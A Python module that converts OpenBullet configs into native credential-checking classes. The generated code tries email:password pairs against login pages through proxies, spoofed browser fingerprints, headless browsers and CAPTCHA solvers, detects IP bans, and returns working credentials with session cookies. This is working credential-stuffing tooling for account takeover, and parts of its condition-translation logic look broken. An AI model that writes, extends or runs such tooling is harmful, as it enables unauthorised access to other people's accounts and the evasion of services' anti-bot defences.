"""
OpenBullet Config Converter
Converts parsed OB configs into native checker classes
"""

import logging
from typing import Dict, Any, List
from textwrap import dedent, indent

from .parser import (
    OpenBulletConfigParser, ConfigMetadata, RequestBlock,
    ParseBlock, KeycheckBlock, CaptchaBlock, BrowserBlock
)

logger = logging.getLogger(__name__)


class ConfigConverter:
    """
    Converts OpenBullet configs into native Python checker classes
    
    Takes parsed OB config and generates a working checker that inherits
    from BaseChecker and implements the same logic.
    """
    
    def __init__(self):
        self.parser = OpenBulletConfigParser()
    
    def convert_file(self, config_path: str) -> str:
        """
        Convert an OpenBullet config file to Python code
        
        Args:
            config_path: Path to .loli or .anom file
            
        Returns:
            Generated Python code as string
        """
        
        # Parse the config
        parsed = self.parser.parse_file(config_path)
        
        if parsed['type'] == 'loli':
            return self._generate_loli_checker(parsed)
        elif parsed['type'] == 'anom':
            return self._generate_anom_checker(parsed)
        else:
            raise ValueError(f"Unsupported config type: {parsed['type']}")
    
    def _generate_loli_checker(self, parsed: Dict[str, Any]) -> str:
        """Generate checker from LoliScript config"""
        
        metadata: ConfigMetadata = parsed['metadata']
        blocks: List[Any] = parsed['blocks']
        custom_inputs: Dict[str, str] = parsed.get('custom_inputs', {})
        
        # Generate class name from config name
        class_name = self._sanitize_class_name(metadata.name)
        
        # Generate imports
        imports = self._generate_imports(blocks)
        
        # Generate class docstring
        docstring = self._generate_docstring(metadata)
        
        # Generate __init__ method
        init_method = self._generate_init_method(metadata, custom_inputs)
        
        # Generate check_single method
        check_method = self._generate_check_method(blocks, metadata)
        
        # Generate is_account_exists method
        exists_method = self._generate_exists_method()
        
        # Generate helper methods for parsing
        helper_methods = self._generate_helper_methods(blocks)
        
        # Assemble the complete class
        code = f'''{imports}

class {class_name}(BaseChecker):
    """{docstring}"""
    
{indent(init_method, "    ")}
    
{indent(check_method, "    ")}
    
{indent(exists_method, "    ")}
{indent(helper_methods, "    ") if helper_methods else ""}
'''
        
        return code
    
    def _sanitize_class_name(self, name: str) -> str:
        """Convert config name to valid Python class name"""
        
        # Remove special characters
        name = ''.join(c if c.isalnum() or c == ' ' else '' for c in name)
        
        # Convert to CamelCase
        words = name.split()
        class_name = ''.join(word.capitalize() for word in words)
        
        # Ensure it ends with Checker
        if not class_name.endswith('Checker'):
            class_name += 'Checker'
        
        return class_name
    
    def _generate_imports(self, blocks: List[Any]) -> str:
        """Generate necessary imports based on blocks used"""
        
        imports = [
            "from typing import Dict, Optional, Any",
            "import asyncio",
            "import aiohttp",
            "import re",
            "import json",
            "from ..base import BaseChecker, CheckResult, CheckerResult",
            "import logging",
            ""
        ]
        
        # Check if browser automation is needed
        needs_browser = any(
            isinstance(block, (BrowserBlock, dict)) and 
            (isinstance(block, BrowserBlock) or block.get('type') in ['NAVIGATE', 'BROWSERACTION'])
            for block in blocks
        )
        
        if needs_browser:
            imports.insert(-1, "from playwright.async_api import async_playwright")
        
        # Check if CAPTCHA solving is needed
        needs_captcha = any(
            isinstance(block, (CaptchaBlock, dict)) and
            (isinstance(block, CaptchaBlock) or block.get('type') == 'CAPTCHA')
            for block in blocks
        )
        
        if needs_captcha:
            imports.insert(-1, "from solvers.captcha import CaptchaSolver")
        
        imports.append("logger = logging.getLogger(__name__)")
        imports.append("")
        
        return '\n'.join(imports)
    
    def _generate_docstring(self, metadata: ConfigMetadata) -> str:
        """Generate class docstring from metadata"""
        
        lines = [
            f"OpenBullet Config: {metadata.name}",
            "",
            f"Author: {metadata.author}",
            f"Category: {metadata.category}",
        ]
        
        if metadata.creation_date:
            lines.append(f"Created: {metadata.creation_date}")
        
        lines.extend([
            "",
            "Auto-generated from OpenBullet config",
            "Converted to native Python checker"
        ])
        
        return '\n    '.join(lines)
    
    def _generate_init_method(self, metadata: ConfigMetadata, custom_inputs: Dict[str, str]) -> str:
        """Generate __init__ method"""
        
        service_name = metadata.name.lower().replace(' ', '_')
        
        code = f'''def __init__(self, config: Dict[str, Any] = None):
    super().__init__("{service_name}", config)
    
    # Config settings from OpenBullet
    self.timeout = {metadata.timeout}
    self.needs_proxies = {metadata.needs_proxies}
    self.max_bots = {metadata.max_bots}
'''
        
        # Add custom inputs as instance variables
        if custom_inputs:
            code += "\n    # Custom inputs\n"
            for var_name, description in custom_inputs.items():
                code += f'    self.{var_name.lower()} = config.get("{var_name.lower()}", "")  # {description}\n'
        
        return code
    
    def _generate_check_method(self, blocks: List[Any], metadata: ConfigMetadata) -> str:
        """Generate check_single method"""
        
        # Determine if we need browser automation
        needs_browser = any(
            isinstance(block, (BrowserBlock, dict)) and
            (isinstance(block, BrowserBlock) or block.get('type') in ['NAVIGATE', 'BROWSERACTION'])
            for block in blocks
        )
        
        if needs_browser:
            return self._generate_browser_check_method(blocks, metadata)
        else:
            return self._generate_http_check_method(blocks, metadata)
    
    def _generate_http_check_method(self, blocks: List[Any], metadata: ConfigMetadata) -> str:
        """Generate HTTP-based check method"""
        
        code = '''async def check_single(
    self,
    email: str,
    password: str,
    proxy: Optional[Any] = None,
    fingerprint: Optional[Any] = None
) -> CheckResult:
    """Check credentials using HTTP requests"""
    
    start_time = asyncio.get_event_loop().time()
    
    try:
        # Setup session
        proxy_url = proxy.get_url() if proxy else None
        timeout = aiohttp.ClientTimeout(total=self.timeout / 1000)
        
        async with aiohttp.ClientSession(timeout=timeout) as session:
            # Variables storage (like OpenBullet)
            variables = {
                'INPUT': f'{email}:{password}',
                'EMAIL': email,
                'PASSWORD': password
            }
            
'''
        
        # Generate code for each block
        for i, block in enumerate(blocks):
            if isinstance(block, RequestBlock):
                code += self._generate_request_code(block, i)
            elif isinstance(block, ParseBlock):
                code += self._generate_parse_code(block, i)
            elif isinstance(block, KeycheckBlock):
                code += self._generate_keycheck_code(block, i)
            elif isinstance(block, CaptchaBlock):
                code += self._generate_captcha_code(block, i)
            elif isinstance(block, dict):
                # Generic block handling
                block_type = block.get('type', '')
                if block_type == 'REQUEST':
                    # Handle dict format request
                    pass
        
        code += '''
            # If we got here without returning, credentials failed
            response_time = (asyncio.get_event_loop().time() - start_time) * 1000
            
            return CheckResult(
                status=CheckerResult.FAILURE,
                email=email,
                service=self.service_name,
                message="Invalid credentials",
                response_time=response_time
            )
    
    except Exception as e:
        logger.error(f"Check error: {e}", exc_info=True)
        return CheckResult(
            status=CheckerResult.ERROR,
            email=email,
            service=self.service_name,
            message=str(e)
        )
'''
        
        return code
    
    def _generate_browser_check_method(self, blocks: List[Any], metadata: ConfigMetadata) -> str:
        """Generate browser automation check method"""
        
        code = '''async def check_single(
    self,
    email: str,
    password: str,
    proxy: Optional[Any] = None,
    fingerprint: Optional[Any] = None
) -> CheckResult:
    """Check credentials using browser automation"""
    
    start_time = asyncio.get_event_loop().time()
    
    try:
        async with async_playwright() as p:
            # Launch browser
            browser_config = {'headless': True}
            
            if proxy:
                browser_config['proxy'] = {'server': proxy.get_url()}
            
            browser = await p.chromium.launch(**browser_config)
            
            # Apply fingerprint
            context_options = {}
            if fingerprint:
                context_options = fingerprint.get_playwright_config(fingerprint)
            
            context = await browser.new_context(**context_options)
            page = await context.new_page()
            
            # Variables storage
            variables = {
                'EMAIL': email,
                'PASSWORD': password
            }
            
'''
        
        # Generate code for browser blocks
        for i, block in enumerate(blocks):
            if isinstance(block, BrowserBlock) or (isinstance(block, dict) and block.get('type') == 'NAVIGATE'):
                code += self._generate_browser_action_code(block, i)
            elif isinstance(block, ParseBlock):
                code += self._generate_browser_parse_code(block, i)
            elif isinstance(block, KeycheckBlock):
                code += self._generate_keycheck_code(block, i)
        
        code += '''
            await browser.close()
            
            # If we got here, check failed
            response_time = (asyncio.get_event_loop().time() - start_time) * 1000
            
            return CheckResult(
                status=CheckerResult.FAILURE,
                email=email,
                service=self.service_name,
                message="Login failed",
                response_time=response_time
            )
    
    except Exception as e:
        logger.error(f"Browser check error: {e}", exc_info=True)
        return CheckResult(
            status=CheckerResult.ERROR,
            email=email,
            service=self.service_name,
            message=str(e)
        )
'''
        
        return code
    
    def _generate_request_code(self, block: RequestBlock, index: int) -> str:
        """Generate code for REQUEST block"""
        
        # Replace variables in URL and POST data
        url = self._prepare_variable_string(block.url)
        
        code = f'''
            # REQUEST block {index + 1}
            async with session.{block.method.lower()}(
                {url},
'''
        
        if block.post_data:
            post_data = self._prepare_variable_string(block.post_data)
            code += f'                data={post_data},\n'
        
        if block.custom_headers:
            code += '                headers={\n'
            for key, value in block.custom_headers.items():
                value_str = self._prepare_variable_string(value)
                code += f'                    "{key}": {value_str},\n'
            code += '                },\n'
        
        code += '''                proxy=proxy_url
            ) as response:
                response_text = await response.text()
                variables['SOURCE'] = response_text
                variables['RESPONSECODE'] = str(response.status)
                
                # Store cookies
                for cookie in response.cookies:
                    variables[f'COOKIE_{cookie.key}'] = cookie.value
'''
        
        return code
    
    def _generate_parse_code(self, block: ParseBlock, index: int) -> str:
        """Generate code for PARSE block"""
        
        code = f'''
            # PARSE block {index + 1}: {block.label}
'''
        
        if block.left and block.right:
            # Left-Right parsing
            code += f'''            {block.label} = self._parse_between(
                variables.get('{block.source}', ''),
                '{block.left}',
                '{block.right}',
                recursive={block.recursive}
            )
            variables['{block.label}'] = {block.label}
'''
        elif block.regex:
            # Regex parsing
            code += f'''            match = re.search(r'{block.regex}', variables.get('{block.source}', ''))
            {block.label} = match.group(1) if match else ''
            variables['{block.label}'] = {block.label}
'''
        
        return code
    
    def _generate_keycheck_code(self, block: KeycheckBlock, index: int) -> str:
        """Generate code for KEYCHECK block"""
        
        code = f'''
            # KEYCHECK block {index + 1}
'''
        
        for key_condition in block.keys:
            condition = key_condition['condition']
            result = key_condition['result']
            
            # Convert OpenBullet condition to Python
            python_condition = self._convert_keycheck_condition(condition)
            
            if result == 'SUCCESS':
                code += f'''            if {python_condition}:
                # Success!
                cookies = {{k: v for k, v in variables.items() if k.startswith('COOKIE_')}}
                
                response_time = (asyncio.get_event_loop().time() - start_time) * 1000
                
                return CheckResult(
                    status=CheckerResult.SUCCESS,
                    email=email,
                    password=password,
                    service=self.service_name,
                    message="Login successful",
                    session_data={{'cookies': cookies, 'variables': variables}},
                    response_time=response_time
                )
'''
            elif result == 'BAN':
                code += f'''            elif {python_condition}:
                return CheckResult(
                    status=CheckerResult.IP_BLOCKED,
                    email=email,
                    service=self.service_name,
                    message="IP banned or blocked"
                )
'''
        
        return code
    
    def _generate_captcha_code(self, block: CaptchaBlock, index: int) -> str:
        """Generate code for CAPTCHA block"""
        
        code = f'''
            # CAPTCHA block {index + 1}
            if self.captcha_solver:
                captcha_solution = await self.captcha_solver.solve_{block.captcha_type}(
                    site_key='{block.site_key}',
                    page_url='{block.url}'
                )
                variables['{block.variable_name}'] = captcha_solution
            else:
                return CheckResult(
                    status=CheckerResult.CAPTCHA,
                    email=email,
                    service=self.service_name,
                    message="CAPTCHA detected but no solver configured"
                )
'''
        
        return code
    
    def _generate_browser_action_code(self, block, index: int) -> str:
        """Generate code for browser action"""
        
        if isinstance(block, BrowserBlock):
            action = block.action
            selector = block.selector
            input_val = block.input
        else:
            action = block.get('type', 'NAVIGATE')
            selector = ''
            input_val = ''
        
        code = f'''
            # Browser action {index + 1}: {action}
'''
        
        if action == 'NAVIGATE' or 'url' in str(block).lower():
            url = getattr(block, 'url', '') if isinstance(block, BrowserBlock) else ''
            code += f'''            await page.goto('{url}', wait_until='networkidle')
            await asyncio.sleep(1)
'''
        elif action == 'ELEMENTACTION':
            if 'click' in input_val.lower():
                code += f'''            await page.click('{selector}')
'''
            elif input_val:
                # Replace variables
                input_str = self._prepare_variable_string(input_val)
                code += f'''            await page.fill('{selector}', {input_str})
'''
        
        return code
    
    def _generate_browser_parse_code(self, block: ParseBlock, index: int) -> str:
        """Generate code for parsing in browser context"""
        
        code = f'''
            # Parse from page: {block.label}
'''
        
        if block.left and block.right:
            code += f'''            page_content = await page.content()
            {block.label} = self._parse_between(page_content, '{block.left}', '{block.right}')
            variables['{block.label}'] = {block.label}
'''
        
        return code
    
    def _generate_exists_method(self) -> str:
        """Generate is_account_exists method stub"""
        
        return '''async def is_account_exists(
    self,
    email: str,
    proxy: Optional[Any] = None
) -> bool:
    """Check if account exists (implement based on service)"""
    # This would need service-specific implementation
    return False
'''
    
    def _generate_helper_methods(self, blocks: List[Any]) -> str:
        """Generate helper methods for parsing"""
        
        # Check if parsing is used
        has_parsing = any(isinstance(block, ParseBlock) for block in blocks)
        
        if not has_parsing:
            return ''
        
        return '''def _parse_between(self, text: str, left: str, right: str, recursive: bool = False) -> str:
    """Parse text between left and right delimiters"""
    try:
        start = text.index(left) + len(left)
        end = text.index(right, start)
        return text[start:end]
    except (ValueError, IndexError):
        return ''
'''
    
    def _prepare_variable_string(self, text: str) -> str:
        """Convert OpenBullet variable syntax to Python f-string"""
        
        # Replace <INPUT> with {email}:{password}
        text = text.replace('<INPUT>', '{email}:{password}')
        text = text.replace('<USER>', '{email}')
        text = text.replace('<PASS>', '{password}')
        
        # Replace <VARIABLE> with {variables['VARIABLE']}
        import re
        pattern = r'<([A-Z_]+)>'
        
        def replace_var(match):
            var_name = match.group(1)
            return "{variables.get('" + var_name + "', '')}"
        
        text = re.sub(pattern, replace_var, text)
        
        # Return as f-string
        if '{' in text:
            return f'f"{text}"'
        else:
            return f'"{text}"'
    
    def _convert_keycheck_condition(self, condition: str) -> str:
        """Convert OpenBullet keycheck condition to Python"""
        
        # Simple conversion - this could be much more sophisticated
        condition = condition.replace('Key Contains', "'SOURCE' in variables.get('SOURCE', '') and")
        condition = condition.replace('Source Contains', "variables.get('SOURCE', '').find(")
        condition = condition.replace('SUCCESS', 'True')
        
        # Handle string literals
        condition = condition.replace('"', "'")
        
        return condition
    
    def _generate_anom_checker(self, parsed: Dict[str, Any]) -> str:
        """Generate checker from Anomaly C# config"""
        
        # For C# configs, we'd need to translate C# to Python
        # This is complex and would require a C# parser
        # For now, return a template
        
        metadata = parsed['metadata']
        class_name = self._sanitize_class_name(metadata.name)
        
        return f'''# TODO: Manual conversion required for Anomaly C# config
# Original config: {metadata.name}
# 
# The C# code needs to be manually translated to Python
# or use the embedded C# executor (if available)

from ..base import BaseChecker, CheckResult, CheckerResult

class {class_name}(BaseChecker):
    """
    {metadata.name}
    
    NOTE: This is a C#-based config that requires manual conversion
    """
    
    def __init__(self, config=None):
        super().__init__("{metadata.name.lower()}", config)
    
    async def check_single(self, email, password, proxy=None, fingerprint=None):
        # Implement C# logic here
        raise NotImplementedError("C# config conversion not yet implemented")
    
    async def is_account_exists(self, email, proxy=None):
        return False
'''
